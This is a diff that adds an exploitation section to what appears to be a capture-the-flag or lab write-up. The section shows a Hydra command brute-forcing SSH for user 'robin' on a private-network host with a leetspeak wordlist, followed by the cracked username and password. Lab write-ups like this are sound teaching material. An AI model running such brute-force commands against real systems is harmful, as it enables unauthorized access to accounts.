@@ -87,3 +87,18 @@ information.txt :
 p_lists.txt: Contains a list of potential passwords (leetspeak variations)
 ![Nmap Scan Results](screenshot/p-list.png)
 
+## Phase 4: Exploitation
+
+1. SSH Brute-force
+Use Hydra to brute-force SSH access for user "robin" :
+
+```bash
+hydra -l robin -P p_lists.txt ssh://192.168.100.117
+```
+Credentials found :
+
+Username: robin
+
+Password: k4rv3ndh4nh4ck3r
+
+![Nmap Scan Results](screenshot/p-list.png)
